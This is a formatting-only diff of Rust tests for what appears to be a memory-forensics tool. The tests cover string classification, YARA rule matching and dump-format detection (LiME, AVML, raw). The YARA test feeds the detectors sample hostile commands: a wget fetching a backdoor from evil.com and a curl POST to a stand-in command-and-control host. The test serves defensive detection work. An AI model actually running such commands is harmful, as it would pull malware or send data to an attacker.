@@ -148,10 +148,19 @@ fn elf_core_extract_and_classify() {
 
     let email_matches: Vec<_> = strings
         .iter()
-        .filter(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::Email))
+        .filter(|s| {
+            s.categories
+                .iter()
+                .any(|(c, _)| *c == StringCategory::Email)
+        })
         .collect();
-    assert!(!email_matches.is_empty(), "should detect email in ELF core dump");
-    assert!(email_matches[0].value.contains("admin@malicious-domain.org"));
+    assert!(
+        !email_matches.is_empty(),
+        "should detect email in ELF core dump"
+    );
+    assert!(email_matches[0]
+        .value
+        .contains("admin@malicious-domain.org"));
 }
 
 // ---------------------------------------------------------------------------
@@ -240,20 +249,15 @@ rule detect_curl {{
         .unwrap();
     }
 
-    let classifier =
-        memf_strings::yara_classifier::YaraClassifier::from_rules_dir(&dir).unwrap();
+    let classifier = memf_strings::yara_classifier::YaraClassifier::from_rules_dir(&dir).unwrap();
 
     let wget_matches = classifier.scan_string("wget http://evil.com/backdoor");
     assert_eq!(wget_matches.len(), 1);
-    assert!(
-        matches!(&wget_matches[0].0, StringCategory::YaraMatch(name) if name == "detect_wget")
-    );
+    assert!(matches!(&wget_matches[0].0, StringCategory::YaraMatch(name) if name == "detect_wget"));
 
     let curl_matches = classifier.scan_string("curl -X POST http://c2.attacker.org");
     assert_eq!(curl_matches.len(), 1);
-    assert!(
-        matches!(&curl_matches[0].0, StringCategory::YaraMatch(name) if name == "detect_curl")
-    );
+    assert!(matches!(&curl_matches[0].0, StringCategory::YaraMatch(name) if name == "detect_curl"));
 
     // Clean up
     std::fs::remove_file(&rule1_path).ok();
@@ -297,9 +301,10 @@ fn multiple_classifiers_pipeline() {
     );
     // Email
     assert!(
-        strings
+        strings.iter().any(|s| s
+            .categories
             .iter()
-            .any(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::Email)),
+            .any(|(c, _)| *c == StringCategory::Email)),
         "should classify Email"
     );
     // Registry key
@@ -327,9 +332,7 @@ fn multiple_classifiers_pipeline() {
 // ---------------------------------------------------------------------------
 #[test]
 fn format_auto_detection_lime() {
-    let dump = LimeBuilder::new()
-        .add_range(0x1000, &[0xCC; 256])
-        .build();
+    let dump = LimeBuilder::new().add_range(0x1000, &[0xCC; 256]).build();
     let path = std::env::temp_dir().join("memf_autodetect_lime_e2e");
     std::fs::write(&path, &dump).unwrap();
 
@@ -344,9 +347,7 @@ fn format_auto_detection_lime() {
 // ---------------------------------------------------------------------------
 #[test]
 fn format_auto_detection_avml() {
-    let dump = AvmlBuilder::new()
-        .add_range(0x2000, &[0xDD; 256])
-        .build();
+    let dump = AvmlBuilder::new().add_range(0x2000, &[0xDD; 256]).build();
     let path = std::env::temp_dir().join("memf_autodetect_avml_e2e");
     std::fs::write(&path, &dump).unwrap();
 
@@ -369,7 +370,10 @@ fn format_auto_detection_raw() {
 
     // open_dump should return UnknownFormat for raw data (probe score 5 < 20)
     let result = memf_format::open_dump(&path);
-    assert!(result.is_err(), "raw data should not be auto-detected by open_dump");
+    assert!(
+        result.is_err(),
+        "raw data should not be auto-detected by open_dump"
+    );
 
     // Direct construction via RawProvider::from_path works
     let provider = memf_format::raw::RawProvider::from_path(&path).unwrap();
@@ -469,9 +473,7 @@ fn all_formats_round_trip() {
 
     // LiME: create -> open -> read -> verify
     {
-        let dump = LimeBuilder::new()
-            .add_range(0x1000, &test_data)
-            .build();
+        let dump = LimeBuilder::new().add_range(0x1000, &test_data).build();
         let path = std::env::temp_dir().join("memf_roundtrip_lime");
         std::fs::write(&path, &dump).unwrap();
         let provider = memf_format::open_dump(&path).unwrap();
@@ -485,9 +487,7 @@ fn all_formats_round_trip() {
 
     // AVML: create -> open -> read -> verify
     {
-        let dump = AvmlBuilder::new()
-            .add_range(0x2000, &test_data)
-            .build();
+        let dump = AvmlBuilder::new().add_range(0x2000, &test_data).build();
         let path = std::env::temp_dir().join("memf_roundtrip_avml");
         std::fs::write(&path, &dump).unwrap();
         let provider = memf_format::open_dump(&path).unwrap();
